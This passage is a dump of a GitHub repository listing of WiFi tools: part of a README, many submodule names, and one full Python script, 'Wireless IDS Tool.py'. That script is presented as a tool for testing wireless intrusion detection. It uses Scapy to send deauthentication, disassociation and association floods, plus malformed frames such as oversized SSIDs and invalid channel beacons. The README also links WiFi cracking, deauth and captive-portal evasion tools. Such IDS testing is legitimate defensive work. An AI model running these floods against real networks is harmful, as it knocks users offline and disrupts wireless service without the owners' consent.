monitor access point signal strength.\n* [Wifi-monitor](https://github.com/dave5623/wifi_monitor/) - \n* [Wifi-monitor](https://github.com/tadashi/wifi-monitor/) - Python, py_libpcap, handover \n* [WiPy](https://github.com/bliz937/WiPy/) - Sends the WiFi signal strength from multiple clients to a central server. Built for Arch Linux ARM running on Raspberry pi 2\n* [WLAN-Monitoring](https://github.com/sajjanbh/WLAN-Monitoring/) - Monitor our vicinity to monitor wireless devices and traffic\n* [wmon](https://github.com/wmon/wmon/) - A Wireless Network Monitor with advanced measurement capabilities. \n## Miscellaneous/not sorted :)\n* [80211ping](https://github.com/tillwo/80211ping/) - Linux command-line tool to ping 802.11 stations (e.g. any WiFi device)\n* [acs](https://github.com/mcgrof/acs/) - Automatic Channel Selection utility\n* [Airfree-wt](https://github.com/rednaks/airfree-wt/) - Wireless Security Toolkit\n* [Ap-notify](https://github.com/doctaweeks/ap-notify/) - An example of using the Linux kernel netlink protocol, specifically nl80211 via libnl/libnl-genl, to catch stations associating/disassociating with an 802.11 AP\n* [ath9k-4w-patch](https://github.com/rboninsegna/ath9k-4W-patch/) - Resources for increasing power of ath9k devices, such as TP-link WN722N\n* [Ath9k-nav](https://github.com/hughobrien/ath9k-nav/) - Linux kernel module to poll the NAV register on Atheros 9k series WLAN cards. \n* [bunny](https://github.com/mothran/bunny/) - Bunny is a wireless. meshing, darknet that uses 802.11 to hide its communications \n* [captiv8](https://github.com/wraith-wireless/captiv8/) - Captive Portal Evasion Tool\n* [Connect-wifi](https://github.com/mousam05/connect-wifi/) - Dmenu based application for Linux that connects to the strongest open wireless network\n* [Cover-channel](https://github.com/abnarain/covert_channel/) - Userland code for creating a covert channel in wireless broadcast medium\n* [disassociatedWiFi](https://github.com/bradleykirwan/disassociatedWiFi/) - DisassociatedWiFi creates a virtual network interface (using the Linux TUN/TAP device driver) which sends and receives ethernet frames over an 802.11 (WiFi) interface, that has been placed in monitor mode, and supports packet injection.\n* [FFT_eval](https://github.com/simonwunderlich/FFT_eval/) - Aid open source spectrum analyzer development for Qualcomm/Atheros AR92xx and AR93xx based chipsets\n* [Frame-randomizer](https://github.com/mike-albano/frame-randomizer/) - Capture and randomize 802.11 Association Request frames\n* [FreeWifi](https://github.com/kylemcdonald/FreeWifi/) - How to get free wifi\n* [Haiku-wifi](https://github.com/jedahan/haiku-wifi/) - Turn your wireless router's extra radios into a public billboard!\n* [kismet2earth](https://code.google.com/archive/p/kismet2earth/) - Set of utilities that convert from Kismet logs to Google Earth .kml format\n* [kismeth2earth](https://github.com/andreagrandi/kismeth2earth/) - Parsing Kismet logs to get collected data from wireless networks and generate a Google Earth map\n* [Kismet-to-KML](https://github.com/exp/Kismet-to-KML/) - Converts kismet gps log files into kml files\n* [Mac-analyzer](https://github.com/abnarain/mac-analyzer/) - Collects cross layer stats from ath9k \n* [Madwifi-be](https://github.com/paulpatras/madwifi-be/) - Modified version of the madwifi driver allowing update of WME parameters for the BE access category\n* [Madwifi-hopping](https://github.com/paulpatras/madwifi-hopping/) - Modified version of the Madwifi WLAN driver, that employs power-hopping for packet transmission\n* [make-a-new-mac80211-to-wirelessAP](https://github.com/fhector/make-a-new-mac80211-to-wirelessAP/) - \n* [netxml2kml](http://www.salecker.org/software/netxml2kml.html/) - Converts netxml files from Kismet Newcore into KML or KMZ files for Google Earth\n* [Osx-wificleaner](https://github.com/mubix/osx-wificleaner/) - Cleans out open wireless connections from OSX machine \n* [Osx-wifi-scan](https://github.com/kornysietsma/osx-wifi-scan/) - Hacky wifi signal scanner for osx \n* [parsecaps](https://github.com/sa7mon/parsecaps/) - Parse wpa.cap generated from besside-ng and create individual .caps for each network with a captured handshake. \n* [pcap80211analyzer](https://github.com/enukane/pcap80211analyzer/) - Not-so-smart 802.11 frame pcapng analyzer \n* [Probr-analysis](https://github.com/probr/probr-analysis/) - Analysis components for the probr WiFi tracking system\n* [py_DD_WRT_Remote_Mac_Adder](https://github.com/mzhaase/py_DD_WRT_Remote_Mac_Adder/) - Python Script to remotely update mac filterlists of DD-WRT routers with wl or atheros wifi drivers\n* [pykismetkml](https://code.google.com/archive/p/pykismetkml/wikis/pykismetkml.wiki/) - Python script designed to export .gps and .xml files (in < Kismet RC1) to .kml files and .netxml files to .kml files in => Kismet RC2\n* [pykismetstats](https://github.com/0x90/pykismetstats/) - Pykismetstats parses NetXML file generated by kismet and write statistics to CSV file.\n* [PyScapy](https://github.com/ogreworld/PyScapy/) - This is a package of using scapy.\n* [react80211](https://github.com/fabriziogiuliano/react80211/) - Solution for mitigating the performance impairments of CSMA/CA protocols in multi-hop topologies based on the dynamic adaptation of the contention process experienced by nodes in a wireless network\n* [Rollmac](https://github.com/violentshell/Rollmac/) - Automated WiFi limit evasion\n* [Scapy-rssi](https://github.com/azz2k/scapy-rssi/) - Example of how to read RSSI values from wifi packaged using Scapy\n* [setbssid](https://github.com/sheenhx/setbssid/) - Modify the MAC80211 layer in Linux Kernel\n* [skybluetero](https://code.google.com/archive/p/skybluetero/) - 802.11b/g packet airtime consumption analyzer GUI for Linux\n* [sniffmypackets](https://github.com/catalyst256/sniffMyPackets/) - Canari package for pcap file analysis within Maltego\n* [Snoopy-ng](https://github.com/sensepost/snoopy-ng/) - Snoopy v2.0 - modular digital terrestrial tracking framework\n* [spectrum.py](https://github.com/0x90/wifi-arsenal/blob/master/spectrum.py/) - \n* [VX](https://github.com/hellais/VX/) - It might be fun to play tricks on somebody trying to crack your WEP protected router\n* [Wbc-utils](https://github.com/skullkey/wbc-utils/) - Couple of hacked together utils for use with the wifibroadcast system by befinitiv\n* [wi5-aggregation](https://github.com/Wi5/wi5-aggregation/) - Implementing and testing 802.11 frame aggregation (A-MPDU) \n* [WiFi-Analyzer](https://github.com/b00sti/WiFi-Analyzer/) - Analyzer 802.11 networks - android app [to refactor] \n* [wifi_based_population_estimator](https://github.com/siriuxy/wifi_based_population_estimator/) - This is a piece of glueware that sticks up different components from hardware detection to real-time web display.\n* [Wifi-beeper](https://github.com/tillwo/wifi-beeper/) - Linux command-line tool to make WLAN frames audible\n* [wifidec](https://github.com/twitchyliquid64/wifidec/) - Repository for scriptz playing around with decoding elements of the Wifi stack (mainly Radiotap and 802.11 frames)\n* [wifi_decode](https://github.com/cmpxchg8/wifi_decode/) - Wireless Key Dumper for Windows\n* [WifiDirectLinux](https://github.com/arplote/WifiDirectLinux/) - Use p2p with Wifi Direct on Linux\n* [Wifidog-gateway](https://github.com/wifidog/wifidog-gateway/) - Repository for the wifidog-gateway captive portal designed for embedded systems\n* [Wifi-dump-analysis](https://github.com/abnarain/wifi-dump-analysis/) - Processing wireless traces from binary files written and read in custom format.\n* [wifi_dump_parser-v3](https://github.com/abnarain/wifi_dump_parser-v3/) - Is the modified parser for the new data set collected using Wifi-dump\n* [wifi_dump-tmpfs](https://github.com/abnarain/wifi_dump-tmpfs/) - Dumps wifi data \n* [wifihisicipy](https://github.com/saljam/wifihisicipy/) -  Temporarily runs a wifi hotspot and a 'captive portal' to let you choose a permanent wireless network to connect to.\n* [wifi](https://github.com/rockymeza/wifi/) - [unmaintained] WiFi tools for linux http://pypi.python.org/pypi/wifi\n* [wifirxpower](https://github.com/cnlohr/wifirxpower/) - Linux-based WiFi RX Power Grapher\n* [wifiScanMap](https://github.com/mehdilauters/wifiScanMap/) - An other wifi mapping tool\n* [WiFi-scheduling](https://github.com/UtkMSNL/WiFi-scheduling/) - This project evaluates the efficiency and overhead of wireless network scheduling\n* [wifi_statistics](https://github.com/simonwunderlich/wifi_statistics/) - Linux kernel module to gather wifi statistics from peer and non-peer STAs \n* [wifitracker](https://github.com/DHNishi/wifitracker/) - Raspberry Pi Wifi Tracking API\n* [WifiTrafficAnalyzer](https://github.com/Bob-King/WifiTrafficAnalyzer/) - \n* [wifresti](https://github.com/LionSec/wifresti/) - Find your wireless network password in Windows , Linux and Mac OS\n* [wime](https://github.com/anburocky3/wime/) - Wifi password recover tool for Windows, Linux, Mac.\n* [win32wifi](https://github.com/kedos/win32wifi/) - Python Windows Wifi\n* [wireless_half-mini](https://github.com/toleda/wireless_half-mini/) - MacOS Airport Half Mini (WiFi and Bluetooth)\n* [WIRELESSINFO](https://github.com/rgupta9/WIRELESSINFO/) - Extract Important Data From Cisco Wireless Controllers\n* [wireless_RSSI](https://github.com/agnostino/wireless_RSSI/) - \n* [Wireless-tools](https://github.com/bakerface/wireless-tools/) - Wireless tools for Node.js \n* [wit](https://github.com/substack/wit/) - Command-line wifi manager for linux\n* [wobs](https://github.com/observ3r/wobs/) - Detects near-by devices such as cell phones, tablets, and laptops. Does this through 802.11, Bluetooth, cell phone protocols, etc.. \n"
        },
        {
          "name": "RT73-USB-Wireless-",
          "type": "commit",
          "content": null
        },
        {
          "name": "RTL8188-hostapd",
          "type": "commit",
          "content": null
        },
        {
          "name": "Radioparse",
          "type": "commit",
          "content": null
        },
        {
          "name": "RadiusStats",
          "type": "commit",
          "content": null
        },
        {
          "name": "RegMon",
          "type": "commit",
          "content": null
        },
        {
          "name": "RogueAP-Detector",
          "type": "commit",
          "content": null
        },
        {
          "name": "RogueDetection",
          "type": "commit",
          "content": null
        },
        {
          "name": "RogueSploit",
          "type": "commit",
          "content": null
        },
        {
          "name": "Rollmac",
          "type": "commit",
          "content": null
        },
        {
          "name": "RougeDetection",
          "type": "commit",
          "content": null
        },
        {
          "name": "Rspoof",
          "type": "commit",
          "content": null
        },
        {
          "name": "SSIDentity",
          "type": "commit",
          "content": null
        },
        {
          "name": "Scapy-wireless-scanner",
          "type": "commit",
          "content": null
        },
        {
          "name": "ScapyGELFtoGraylog2",
          "type": "commit",
          "content": null
        },
        {
          "name": "Side-channel",
          "type": "commit",
          "content": null
        },
        {
          "name": "TCP-SeqNum",
          "type": "commit",
          "content": null
        },
        {
          "name": "Thesis",
          "type": "commit",
          "content": null
        },
        {
          "name": "Tools-Airgeddon",
          "type": "commit",
          "content": null
        },
        {
          "name": "USB-WiFi-Autoreset",
          "type": "commit",
          "content": null
        },
        {
          "name": "VX",
          "type": "commit",
          "content": null
        },
        {
          "name": "VistaRFmon",
          "type": "commit",
          "content": null
        },
        {
          "name": "WAPMap",
          "type": "commit",
          "content": null
        },
        {
          "name": "WHAT",
          "type": "commit",
          "content": null
        },
        {
          "name": "WHAT-PRO",
          "type": "commit",
          "content": null
        },
        {
          "name": "WHAT-Pi",
          "type": "commit",
          "content": null
        },
        {
          "name": "WIG",
          "type": "commit",
          "content": null
        },
        {
          "name": "WIRELESSINFO",
          "type": "commit",
          "content": null
        },
        {
          "name": "WLAN-Monitoring",
          "type": "commit",
          "content": null
        },
        {
          "name": "WPA2-HalfHandshake-Crack",
          "type": "commit",
          "content": null
        },
        {
          "name": "WPA2-KRACK",
          "type": "commit",
          "content": null
        },
        {
          "name": "WPA_DECRYPTION_MPI",
          "type": "commit",
          "content": null
        },
        {
          "name": "WPSmash",
          "type": "commit",
          "content": null
        },
        {
          "name": "Wall-of-Shame",
          "type": "commit",
          "content": null
        },
        {
          "name": "Watcher",
          "type": "commit",
          "content": null
        },
        {
          "name": "Wave",
          "type": "commit",
          "content": null
        },
        {
          "name": "WiBroute",
          "type": "commit",
          "content": null
        },
        {
          "name": "WiFi-802.11-Demo-Sniffer",
          "type": "commit",
          "content": null
        },
        {
          "name": "WiFi-Analyzer",
          "type": "commit",
          "content": null
        },
        {
          "name": "WiFi-Miner-Detector",
          "type": "commit",
          "content": null
        },
        {
          "name": "WiFi-Pumpkin",
          "type": "commit",
          "content": null
        },
        {
          "name": "WiFi-Rifle",
          "type": "commit",
          "content": null
        },
        {
          "name": "WiFi-autopwner",
          "type": "commit",
          "content": null
        },
        {
          "name": "WiFi-scheduling",
          "type": "commit",
          "content": null
        },
        {
          "name": "WiFiBroot",
          "type": "commit",
          "content": null
        },
        {
          "name": "WiFiHunter",
          "type": "commit",
          "content": null
        },
        {
          "name": "WiFiJammer.py",
          "type": "commit",
          "content": null
        },
        {
          "name": "WiFiStat",
          "type": "commit",
          "content": null
        },
        {
          "name": "WiFiSuite",
          "type": "commit",
          "content": null
        },
        {
          "name": "WiFite2-RPi3-nexmon",
          "type": "commit",
          "content": null
        },
        {
          "name": "WiPy",
          "type": "commit",
          "content": null
        },
        {
          "name": "Wifi-Cracker",
          "type": "commit",
          "content": null
        },
        {
          "name": "Wifi-Dumper",
          "type": "commit",
          "content": null
        },
        {
          "name": "Wifi-Hacking",
          "type": "commit",
          "content": null
        },
        {
          "name": "Wifi-Signal-Plotter",
          "type": "commit",
          "content": null
        },
        {
          "name": "WifiBF",
          "type": "commit",
          "content": null
        },
        {
          "name": "WifiDeauth",
          "type": "commit",
          "content": null
        },
        {
          "name": "WifiScanAndMap",
          "type": "commit",
          "content": null
        },
        {
          "name": "WifiTrafficAnalyzer",
          "type": "commit",
          "content": null
        },
        {
          "name": "Wifi_Trojans",
          "type": "commit",
          "content": null
        },
        {
          "name": "Wifimon",
          "type": "commit",
          "content": null
        },
        {
          "name": "WireCrack",
          "type": "commit",
          "content": null
        },
        {
          "name": "Wireless IDS Tool.py",
          "type": "blob",
          "size": 6.4697265625,
          "content": "#!/usr/bin/env python\n# encoding: utf-8\n\"\"\"\n\nCreated by Jaime Blasco on 2009-10-17.\nCopyright (c) 2009 Alienvault. All rights reserved.\n\"\"\"\n\nimport sys\nimport getopt\nfrom scapy.all import *\n\nhelp_message = \"WIDSTT - Wireless Intrusion Detection Systems Testing Tool  (jaime.blasco@alienvault.com)\\n\" \\\n\t\t\t   \"Usage: \\n\\t-i interface\\n\\t-m module\" \\\n\t\t\t   \"\\tnullProbe\\tSend Probe-response packets with a SSID IE tag component of length 0 (WVE-2006-0064)\\n\" \\\n\t\t\t   \"\\t\\t\\tdisassociateFlood\\t Floods the WLAN with disassociation packets. (WVE-2005-0046)\\n\" \\\n\t\t\t   \"\\t\\t\\tdeauthFlood\\t Floods the WLAN with deauthentication packets. (WVE-2005-0045 )\\n\" \\\n\t\t\t   \"\\t\\t\\tassociateFlood\\t Floods the WLAN with deauthentication packets. (WVE-2005-0045 )\\n\" \\\n\t\t\t   \"\\t\\t\\tinvalidDeauthRcode\\t Sends invalid deauthentication reason code.\\n\" \\\n\t\t\t   \"\\t\\t\\tinvalidDisasRcode\\t Sends invalid disassociation reason code.\\n\" \\\n\t\t\t   \"\\t\\t\\tlongSSID\\t Sends an over-sized SSID. (WVE-2006-0071, WVE-2007-0001)\\n\" \\\n\t\t\t   \"\\t\\t\\tairJack\\t Sends airjack beacon packet. (WVE-2005-0018)\\n\" \\\n\t\t\t   \"\\t\\t\\tinvalidChannellBeacon\\t Sends an an invalid channel number in beacon frames (WVE-2006-0050)\\n\" \\\n\t\t\t   \"\\t\\t\\twindowsZero\\t Windows XP SP1 behaviour\\n\"\n\t\t\t\nmodules = (\"nullProbe\", \"disassociateFlood\", \"deauthFlood\", \"associateFlood\", \"invalidDeauthRcode\", \"invalidDisasRcode\", \"longSSID\", \"airJack\", \"invalidChannellBeacon\", \"windowsZero\")\n\n\ndef RandMAC(template=\"*\"):\n    template += \":*:*:*:*:*\"\n    template = template.split(\":\")\n    mac = ()\n    for i in range(6):\n        if template[i] == \"*\":\n            v = RandByte()\n        elif \"-\" in template[i]:\n            x,y = template[i].split(\"-\")\n            v = RandNum(int(x,16), int(y,16))\n        else:\n            v = int(template[i],16)\n        mac += (v,)\n    return \"%02x:%02x:%02x:%02x:%02x:%02x\" % mac\n\ndef invalidDeauthRcode(interface):\n\n\tstation = RandMAC()\n\tbssid = RandMAC()\n\n\tframe = Dot11(addr1=station, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=500)\n\tsendp(frame, iface = interface)\n\t\ndef invalidDisasRcode(interface):\n\n\tstation = RandMAC()\n\tbssid = RandMAC()\n\n\tframe = Dot11(addr1=station, addr2=bssid, addr3=bssid)/Dot11Disas(reason=500)\n\tsendp(frame, iface = interface)\n\t\ndef disassociateFlood(interface):\n\tstation = RandMAC()\n\tbssid = RandMAC()\n\t\n\tframe = Dot11(addr1=station, addr2=bssid, addr3=bssid)/Dot11Disas(reason=9)\n\t\n\tfor i in range(0, 200):\n\t\tsendp(frame, iface = interface, loop=0)\n\ndef associateFlood(interface):\n\tstation = RandMAC()\n\tbssid = RandMAC()\n\t\n\tframe = Dot11(addr1=station, addr2=bssid, addr3=bssid)/Dot11AssoReq()\n\t\n\tfor i in range(0, 200):\n\t\tsendp(frame, iface = interface, loop=0)\n\ndef authFlood(interface):\n\tstation = RandMAC()\n\tbssid = RandMAC()\n\t\n\tframe = Dot11(addr1=station, addr2=bssid, addr3=bssid)/Dot11Auth()\n\t\n\tfor i in range(0, 200):\n\t\tsendp(frame, iface = interface, loop=0)\n\t\t\ndef deauthFlood(interface):\n\tstation = RandMAC()\n\tbssid = RandMAC()\n\t\n\tframe = Dot11(addr1=station, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=9)\n\t\n\tfor i in range(0, 200):\n\t\tsendp(frame, iface = interface, loop=0)\n\ndef longSSID(interface):\n\tdot11_frame = Dot11(addr1=\"ff:ff:ff:ff:ff:ff\",addr2=RandMAC(),addr3=RandMAC())\n\tdot11ProbeResp_frame = Dot11ProbeResp(cap=\"ESS\")\n\tdot11Elt_frame = Dot11Elt(ID=\"SSID\", len = 100, info = \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\")\n\tpkt = (dot11_frame / dot11ProbeResp_frame / dot11Elt_frame)\n\tprint pkt.show()\n\tsendp(pkt, iface = interface, loop=0);\n\ndef nullProbe(interface):\n\tdot11_frame = Dot11(addr1=\"ff:ff:ff:ff:ff:ff\",addr2=RandMAC(),addr3=RandMAC())\n\tdot11ProbeResp_frame = Dot11ProbeResp(cap=\"ESS\")\n\tdot11Elt_frame = Dot11Elt(ID=\"SSID\", len = 0, info = 0x20)\n\tpkt = (dot11_frame / dot11ProbeResp_frame / dot11Elt_frame)\n\tprint pkt.show()\n\tsendp(pkt, iface = interface, loop=0)\n\ndef airJack(interface):\n\tdot11_frame = Dot11(addr1=\"ff:ff:ff:ff:ff:ff\",addr2=RandMAC(),addr3=RandMAC())\n\tpkt = (Dot11(addr1=\"ff:ff:ff:ff:ff:ff\",addr2=RandMAC(),addr3=RandMAC())/Dot11Beacon(cap=\"ESS\")/Dot11Elt(ID=\"SSID\",info=\"AirJack\")/Dot11Elt(ID=\"Rates\",info='\\x82\\x84\\x0b\\x16')/Dot11Elt(ID=\"DSset\",info=\"\\x03\")/Dot11Elt(ID=\"TIM\",info=\"\\x00\\x01\\x00\\x00\"))\n\tprint pkt.show()\n\tsendp(pkt, iface = interface, loop=0)\n\ndef invalidChannellBeacon(interface):\n\t#Channel 0\n\tdot11_frame = Dot11(addr1=\"ff:ff:ff:ff:ff:ff\",addr2=RandMAC(),addr3=RandMAC())\n\tpkt = (Dot11(addr1=\"ff:ff:ff:ff:ff:ff\",addr2=RandMAC(),addr3=RandMAC())/Dot11Beacon(cap=\"ESS\")/Dot11Elt(ID=\"SSID\",info=\"test\")/Dot11Elt(ID=\"Rates\",info='\\x82\\x84\\x0b\\x16')/Dot11Elt(ID=\"DSset\",info=\"\\x00\")/Dot11Elt(ID=\"TIM\",info=\"\\x00\\x01\\x00\\x00\"))\n\tprint pkt.show()\n\tsendp(pkt, iface = interface, loop=0)\t\n\n\t#Channel 255\n\tdot11_frame = Dot11(addr1=\"ff:ff:ff:ff:ff:ff\",addr2=RandMAC(),addr3=RandMAC())\n\tpkt = (Dot11(addr1=\"ff:ff:ff:ff:ff:ff\",addr2=RandMAC(),addr3=RandMAC())/Dot11Beacon(cap=\"ESS\")/Dot11Elt(ID=\"SSID\",info=\"test\")/Dot11Elt(ID=\"Rates\",info='\\x82\\x84\\x0b\\x16')/Dot11Elt(ID=\"DSset\",info=\"\\xff\")/Dot11Elt(ID=\"TIM\",info=\"\\x00\\x01\\x00\\x00\"))\n\tprint pkt.show()\n\tsendp(pkt, iface = interface, loop=0)\t\t\n\ndef windowsZero(interface):\n\tdot11_frame = Dot11(addr1=\"ff:ff:ff:ff:ff:ff\",addr2=RandMAC(),addr3=RandMAC())\n\tdot11ProbeReq_frame = Dot11ProbeReq()\n\tdot11Elt_frame = Dot11Elt(ID=\"SSID\", len = 32, info = hex('\\0x14\\0x09\\0x03\\0x11\\0x04\\0x11\\0x09\\0x0e\\0x0d\\0x0a\\0x0e\\0x19\\0x02\\0x17\\0x19\\0x02\\0x14\\0x1f\\0x07\\0x04\\0x05\\0x13\\0x12\\0x16\\0x16\\0x0a\\0x01\\0x0a\\0x0e\\0x1f\\0x1c\\0x12'))\n\tpkt = (dot11_frame / dot11ProbeReq_frame / dot11Elt_frame)\n\tsendp(pkt, iface = interface, loop=0);\n\ndef usage():\n\tprint help_message\n\t\ndef main(argv=None):\n\t\n\tmodule = None\n\t\n\tif argv is None:\n\t\targv = sys.argv\n\t\t\n\topts, args = getopt.gnu_getopt(sys.argv[1:], \"m:i::\")\n\tfor option, value in opts:\n\t\tif option in (\"-i\", \"--interface\"):\n\t\t\tinterface = value\n\t\tif option in (\"-m\", \"--module\"):\n\t\t\tmodule = value\n\t\t\t\n\tif not module or module not in modules:\n\t\tusage()\n\t\treturn\n\t\n\tif module == \"nullProbe\":\n\t\tnullProbe(interface)\n\t\t\n\tif module == \"disassociateFlood\":\n\t\tdisassociateFlood(interface)\n\t\t\n\tif module == \"deauthFlood\":\n\t\tdeauthFlood(interface)\n\t\t\n\tif module == \"invalidDeauthRcode\":\n\t\tinvalidDeauthRcode(interface)\n\t\n\tif module == \"invalidDisasRcode\":\n\t\tinvalidDisasRcode(interface)\n\t\t\n\tif module == \"longSSID\":\n\t\tlongSSID(interface)\n\n\tif module == \"airJack\":\n\t\tairJack(interface)\n\t\t\n\tif module == \"invalidChannellBeacon\":\n\t\tinvalidChannellBeacon(interface)\n\t\n\tif module == \"windowsZero\":\n\t\twindowsZero(interface)\n\t\t\n\tif module == \"associateFlood\":\n\t\tassociateFlood(interface)\n\t\t\n\t\n\nif __name__ == \"__main__\":\n\tmain()\n"
        },
        {
          "name": "Wireless-Sniffer",
          "type": "commit",
          "content": null
        },
        {
          "name": "Wireless-forensics-framework",
          "type": "commit",
          "content": null
        },
        {
          "name": "WirelessConfig",
          "type": "commit",
          "content": null
        },
        {
          "name": "WirelessMayhem",
          "type": "commit",
          "content": null
        },
        {
          "name": "Wireless_peeker",
          "type": "commit",
          "content": null
        },
        {
          "name": "Wps-Ultimate-Cracker",
          "type": "commit",
          "content": null
        },
        {
          "name": "access_points",
          "type": "commit",
          "content": null
        },
        {
          "name": "accumulation-rssi",
          "type": "commit",
          "content": null
        },
        {
          "name": "acs",
          "type": "commit",
          "content": null
        },
        {
          "name": "afrag",
          "type": "tree",
          "content": null
        },
        {
          "name": "agentapd",
          "type": "commit",
          "content": null
        },
        {
          "name": "aggr-inject",
          "type": "commit",
          "content": null
        },
        {
          "name": "aircrack-bws",
          "type": "commit",
          "content": null
        },
        {
          "name": "aircrack-db",
          "type": "commit",
          "content": null
        },
        {
          "name": "aircrack-ng",
          "type": "commit",
          "content": null
        },
        {
          "name": "aircrack-ng-iphone",
          "type": "commit",
          "content": null
        },
        {
          "name": "airfree-wt",
          "type": "commit",
          "content": null
        },
        {
          "name": "airgeddon",
          "type": "commit",
          "content": null
        },
        {
          "name": "airgeddon-plugins",
          "type": "commit",
          "content": null
        },
        {
          "name": "airmode",
          "type": "commit",
          "content": null
        },
        {
          "name": "airodump-iv",
          "type": "commit",
          "content": null
        },
        {
          "name": "airodump-logger",
          "type": "commit",
          "content": null
        },
        {
          "name": "airodump_mar_attack",
          "type": "commit",
          "content": null
        },
        {
          "name": "airodump_mod",
          "type": "commit",
          "content": null
        },
        {
          "name": "airown",
          "type": "commit",
          "content": null
        },
        {
          "name": "airport-sniffer",
          "type": "commit",
          "content": null
        },
        {
          "name": "airpwn-ng",
          "type": "commit",
          "content": null
        },
        {
          "name": "airpydump",
          "type": "commit",
          "content": null
        },
        {
          "name": "airscan",
          "type": "commit",
          "content": null
        },
        {
          "name": "airstuff-ng",
          "type": "tree",
          "content": null
        },
        {
          "name": "airtraf",
          "type": "commit",
          "content": null
        },
        {
          "name": "airview",
          "type": "commit",
          "content": null
        },
        {
          "name": "airxploit",
          "type": "commit",
          "content": null
        },
        {
          "name": "android_iw",
          "type": "commit",
          "content": null
        },
        {
          "name": "android_packetspammer",
          "type": "commit",
          "content": null
        },
        {
          "name": "android_reaver-wps",
          "type": "commit",
          "content": null
        },
        {
          "name": "anubis",
          "type": "commit",
          "content": null
        },
        {
          "name": "ap-notify",
          "type": "commit",
          "content": null
        },
        {
          "name": "ap51flash",
          "type": "commit",
          "content": null
        },
        {
          "name": "apbleed",
          "type": "commit",
          "content": null
        },
        {
          "name": "apflood",
          "type": "commit",
          "content": null
        },
        {
          "name": "asleap",
          "type": "tree",
          "content": null
        },
        {
          "name": "ath-info",
          "type": "commit",
          "content": null
        },
        {
          "name": "ath10k-firmware",
          "type": "commit",
          "content": null
        },
        {
          "name": "ath10k-mesh",
          "type": "commit",
          "content": null
        },
        {
          "name": "ath9k",
          "type": "commit",
          "content": null
        },
        {
          "name": "ath9k-4W-patch",
          "type": "commit",
          "content": null
        },
        {
          "name": "ath9k-4W-patch2",
          "type": "commit",
          "content": null
        },
        {
          "name": "ath9k-docs",
          "type": "commit",
          "content": null
        },
        {
          "name": "ath9k-htc-firmware-blob",
          "type": "commit",
          "content": null
        },
        {
          "name": "ath9k-nav",
          "type": "commit",
          "content": null
        },
        {
          "name": "ath9k-spectral-scan",
          "type": "commit",
          "content": null
        },
        {
          "name": "ath9k_ath5k_full_permissive_unlock_all_channels.patch",
          "type": "commit",
          "content": null
        },
        {
          "name": "ath9k_caldata",
          "type": "commit",
          "content": null
        },
        {
          "name": "ath9k_dynack",
          "type": "commit",
          "content": null
        },
        {
          "name": "ath9k_grt",
          "type": "commit",
          "content": null
        },
        {
          "name": "ath_spectral",
          "type": "commit",
          "content": null
        },
        {
          "name": "atheros-patches",
          "type": "commit",
          "content": null
        },
        {
          "name": "atheros_library",
          "type": "commit",
          "content": null
        },
        {
          "name": "auto-reaver",
          "type": "commit",
          "content": null
        },
        {
          "name": "autokwaker",
          "type": "commit",
          "content": null
        },
        {
          "name": "autopwn",
          "type": "tree",
          "content": null
        },
        {
          "name": "awesome-wifi-security",
          "type": "commit",
          "content": null
        },
        {
          "name": "badkarma",
          "type": "commit",
          "content": null
        },
        {
          "name": "banjax",
          "type": "commit",
          "content": null
        },
        {
          "name": "basiciw",
          "type": "commit",
          "content": null
        },
        {
          "name": "bcm-public",
          "type": "commit",
          "content": null
        },
        {
          "name": "bcm-rpi3",
          "type": "commit",
          "content": null
        },
        {
          "name": "bcmon",
          "type": "commit",
          "content": null
        },
        {
          "name": "beaconleak",
          "type": "commit",
          "content": null
        },
        {
          "name": "belkin4xx",
          "type": "commit",
          "content": null
        },
        {
          "name": "boa",
          "type": "commit",
          "content": null
        },
        {
          "name": "brcm80211-trace-cmd",
          "type": "commit",
          "content": null
        },
        {
          "name": "broadcom-wl-monitormode",
          "type": "commit",
          "content": null
        },
        {
          "name": "bully",
          "type": "commit",
          "content": null
        },
        {
          "name": "bunny",
          "type": "commit",
          "content": null
        },
        {
          "name": "cac",
          "type": "commit",
          "content": null
        },
        {
          "name": "call-for-wpa3",
          "type": "commit",
          "content": null
        },
        {
          "name": "capbreaker",
          "type": "commit",
          "content": null
        },
        {
          "name": "captiv8",
          "type": "commit",
          "content": null
        },
        {
          "name": "captiveportal",
          "type": "commit",
          "content": null
        },
        {
          "name": "cenarius",
          "type": "commit",
          "content": null
        },
        {
          "name": "chap2asleap",
          "type": "commit",
          "content": null
        },
        {
          "name": "cherry",
          "type": "commit",
          "content": null
        },
        {
          "name": "ciscowebauth",
          "type": "commit",
          "content": null
        },
        {
          "name": "classIV",
          "type": "commit",
          "content": null
        },
        {
          "name": "cloudap",
          "type": "commit",
          "content": null
        },
        {
          "name": "como",
          "type": "commit",
          "content": null
        },
        {
          "name": "connect-wifi",
          "type": "commit",
          "content": null
        },
        {
          "name": "connme",
          "type": "commit",
          "content": null
        },
        {
          "name": "cookie-monster",
          "type": "commit",
          "content": null
        },
        {
          "name": "cornuprobia",
          "type": "commit",
          "content": null
        },
        {
          "name": "covert_channel",
          "type": "commit",
          "content": null
        },
        {
          "name": "cowpatty",
          "type": "tree",
          "content": null
        },
        {
          "name": "crda",
          "type": "commit",
          "content": null
        },
        {
          "name": "crda-ct",
          "type": "commit",
          "content": null
        },
        {
          "name": "create_ap",
          "type": "commit",
          "content": null
        },
        {
          "name": "cupid",
          "type": "commit",
          "content": null
        },
        {
          "name": "curscout",
          "type": "commit",
          "content": null
        },
        {
          "name": "darm",
          "type": "commit",
          "content": null
        },
        {
          "name": "datasamalen",
          "type": "commit",
          "content": null
        },
        {
          "name": "deauth_dot11decrypt",
          "type": "commit",
          "content": null
        },
        {
          "name": "disable-802.11b-snmp",
          "type": "commit",
          "content": null
        },
        {
          "name": "disassociatedWiFi",
          "type": "commit",
          "content": null
        },
        {
          "name": "dockerfile-hostapd",
          "type": "commit",
          "content": null
        },
        {
          "name": "dot11anonymizer",
          "type": "commit",
          "content": null
        },
        {
          "name": "dot11decrypt",
          "type": "commit",
          "content": null
        },
        {
          "name": "dot11er",
          "type": "commit",
          "content": null
        },
        {
          "name": "dot11sniffer",
          "type": "commit",
          "content": null
        },
        {
          "name": "dw",
          "type": "commit",
          "content": null
        },
        {
          "name": "dwpa",
          "type": "commit",
          "content": null
        },
        {
          "name": "eap_detect",
          "type": "commit",
          "content": null
        },
        {
